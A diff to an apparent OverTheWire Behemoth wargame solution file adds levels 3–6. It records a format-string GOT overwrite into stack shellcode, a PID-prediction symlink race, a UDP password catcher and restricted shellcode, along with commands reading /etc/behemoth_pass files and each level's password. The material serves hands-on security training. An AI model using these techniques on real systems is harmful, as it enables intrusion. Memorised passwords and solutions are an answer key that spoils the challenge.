@@ -2,7 +2,11 @@
  "goals": {
   "0": "Find the password hidden in behemoth0's memfrob-obfuscated check, get a shell, read the next password.",
   "1": "Overflow behemoth1's gets() buffer and get a shell despite ASLR-off ret2libc + dash's privilege drop.",
-  "2": "Win the PID-file race in behemoth2: it touch-es ./<pid>, sleeps, then cat-s it as the next user."
+  "2": "Win the PID-file race in behemoth2: it touch-es ./<pid>, sleeps, then cat-s it as the next user.",
+  "3": "Exploit behemoth3's printf(buf) format string to hijack puts() into stack shellcode.",
+  "4": "behemoth4 prints the file /tmp/<its pid> - predict the pid and pre-plant a symlink to the password file.",
+  "5": "behemoth5 UDP-sends the next password to localhost:1337 - be there to receive it.",
+  "6": "Feed behemoth6_reader a shellcode.txt (no 0x0b bytes allowed) that prints HelloKitty."
  },
  "host": "behemoth.labs.overthewire.org",
  "levels": [
@@ -54,6 +58,69 @@
    ],
    "pw": "3gr7EdpaSr",
    "user": "behemoth2"
+  },
+  {
+   "cmds": [
+    [
+     "# behemoth3: fgets(buf,200,stdin); printf(\"Welcome, \"); printf(buf); puts(...) - buf on stack @0xffffdb00 = printf arg slot 1",
+     "python3 exp3.py  # payload: p32(puts@GOT)+p32(puts@GOT+2) + \"%56194x%1$hn%9333x%2$hn\" -> puts@GOT = 0xffffdb82 (NOP sled + shellcode @ buf+130)",
+     "id",
+     "cat /etc/behemoth_pass/behemoth4"
+    ]
+   ],
+   "lvl": 3,
+   "out": [
+    "uid=13004(behemoth4) gid=13003(behemoth3)",
+    "ABTmcqez7l"
+   ],
+   "pw": "ABTmcqez7l",
+   "user": "behemoth3"
+  },
+  {
+   "cmds": [
+    [
+     "python3 exp4.py  # read /proc/sys/kernel/ns_last_pid, symlink /tmp/<nextpid> -> /etc/behemoth_pass/behemoth5, then run the target",
+     "/behemoth/behemoth4"
+    ]
+   ],
+   "lvl": 4,
+   "out": [
+    "Finished sleeping, fgetcing",
+    "UCEVVD7tz3"
+   ],
+   "pw": "UCEVVD7tz3",
+   "user": "behemoth4"
+  },
+  {
+   "cmds": [
+    [
+     "python3 exp5.py  # bind UDP 0.0.0.0:1337, then run /behemoth/behemoth5",
+     "# behemoth5: fopen /etc/behemoth_pass/behemoth6, gethostbyname(\"localhost\"), sendto(..., htons(1337))"
+    ]
+   ],
+   "lvl": 5,
+   "out": [
+    "got packet from ('127.0.0.1', 41347) : b'gLmUCSSlkL\\n'"
+   ],
+   "pw": "gLmUCSSlkL",
+   "user": "behemoth5"
+  },
+  {
+   "cmds": [
+    [
+     "# behemoth6_reader mmap()s ./shellcode.txt and calls it; 0x0b bytes are rejected",
+     "python3 exp6.py  # 41-byte shellcode (no 0x0b): push \"HelloKitty\\0\", write(1, esp, 10), exit(0); run behemoth6 with cwd containing shellcode.txt",
+     "id",
+     "cat /etc/behemoth_pass/behemoth7"
+    ]
+   ],
+   "lvl": 6,
+   "out": [
+    "uid=13007(behemoth7) gid=13006(behemoth6)",
+    "aHHctqVRgi"
+   ],
+   "pw": "aHHctqVRgi",
+   "user": "behemoth6"
   }
  ],
  "title": "Behemoth"
